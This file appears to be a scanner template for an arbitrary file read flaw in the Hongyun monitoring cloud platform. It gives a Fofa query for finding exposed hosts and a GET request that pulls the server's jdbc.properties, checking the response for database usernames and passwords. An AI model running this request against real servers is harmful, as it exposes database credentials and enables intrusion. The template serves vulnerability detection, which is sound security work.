id: hongyun-mobileaction-filedownload.yaml

info:
  name: 鸿运主动安全监控云平台存在任意文件读取漏洞
  author: zan8in
  severity: high
  verified: true
  description: |-
    Fofa: body="./open/webApi.html"
  reference:
    - https://mp.weixin.qq.com/s/gYBZ2y2Qnz9cuHLTdYRBYA
  tags: hongyun,filedownload
  created: 2023/11/23

rules:
  r0:
    request:
      method: GET
      path: /08gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties
    expression: response.status == 200 && response.body.ibcontains(b'[DATABASE]') && response.body.ibcontains(b'username') && response.body.ibcontains(b'password')
expression: r0()